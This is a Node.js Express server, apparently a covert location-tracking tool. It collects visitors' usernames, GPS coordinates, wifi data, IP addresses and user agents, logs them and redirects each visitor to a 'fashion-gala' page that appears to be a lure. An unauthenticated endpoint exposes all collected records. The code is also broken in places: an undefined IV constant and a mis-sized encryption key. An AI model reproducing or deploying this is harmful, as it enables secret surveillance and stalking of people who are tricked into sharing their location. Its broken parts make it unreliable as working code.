const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const ENCRYPTION_KEY = (process.env.ENCRYPTION_KEY && process.env.ENCRYPTION_KEY.length >= 32) 
  ? process.env.ENCRYPTION_KEY 
  : crypto.randomBytes(32).toString('hex');

console.log("🔑 Encryption Key Länge:", ENCRYPTION_KEY.length);

function encrypt(text) {
  let iv = crypto.randomBytes(IV_LENGTH);
  let cipher = crypto.createCipheriv('aes-256-cbc', Buffer.from(ENCRYPTION_KEY), iv);
  let encrypted = cipher.update(text);
  encrypted = Buffer.concat([encrypted, cipher.final()]);
  return iv.toString('hex') + ':' + encrypted.toString('hex');
}

const app = express();
const PORT = process.env.PORT || 3000;
const LOG_DIR = path.join(__dirname, 'logs');

if (!fs.existsSync(LOG_DIR)) {
  fs.mkdirSync(LOG_DIR);
}

const limiter = require('express-rate-limit')({
  windowMs: 15 * 60 * 1000,
  max: 100,
  keyGenerator: (req) => {
    return req.headers['x-real-ip'] || 
           req.headers['x-forwarded-for']?.split(',')[0] || 
           req.socket.remoteAddress;
  },
  handler: (req, res) => {
    res.status(429).json({ error: "Zu viele Anfragen" });
  }
});

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.json());
app.use(express.static('public'));

app.post('/submit', limiter, async (req, res) => {
  try {
    const { username, method, latitude, longitude, extra } = req.body;
    
    const trackingData = {
      timestamp: new Date().toISOString(),
      ip: req.headers['x-forwarded-for'] || req.ip,
      userAgent: req.headers['user-agent'],
      username: username || 'ANON-' + crypto.randomBytes(3).toString('hex'),
      method: method || 'UNKNOWN',
      coordinates: latitude && longitude ? {
        lat: parseFloat(latitude).toFixed(6),
        lng: parseFloat(longitude).toFixed(6),
        accuracy: extra?.accuracy || null
      } : null,
      wifi: extra?.wifi || null
    };

    fs.appendFileSync(
      path.join(LOG_DIR, 'tracking.log'),
      JSON.stringify(trackingData) + '\n'
    );

    if (process.env.RENDER) {
      fs.appendFileSync(
        path.join(LOG_DIR, 'backup.log'),
        encrypt(JSON.stringify(trackingData)) + '\n'
      );
    }

    console.log(`📍 Tracking erfolgreich: ${trackingData.username}`);
    res.redirect('/fashion-gala.html');

  } catch (error) {
    console.error('❌ Render Tracking Error:', error);
    fs.appendFileSync(
      path.join(LOG_DIR, 'errors.log'),
      `${new Date().toISOString()}|${error.stack}\n`
    );
    res.status(500).json({ error: "Internal server error" });
  }
});

app.get('/get-logs', limiter, (req, res) => {
  try {
    const logs = fs.readFileSync(path.join(LOG_DIR, 'tracking.log'), 'utf-8')
      .split('\n')
      .filter(Boolean)
      .map(JSON.parse);
    res.json({ logs });
  } catch (error) {
    res.status(500).json({ error: "Log read error" });
  }
});

app.listen(PORT, () => {
  console.log(`
  ███████╗███████╗████████╗ █████╗ 
  ╚══███╔╝██╔════╝╚══██╔══╝██╔══██╗
    ███╔╝ █████╗     ██║   ███████║
   ███╔╝  ██╔══╝     ██║   ██╔══██║
  ███████╗███████╗   ██║   ██║  ██║
  ╚══════╝╚══════╝   ╚═╝   ╚═╝  ╚═╝
  `);
  console.log(`Tracking-System aktiv auf Port ${PORT}`);
});
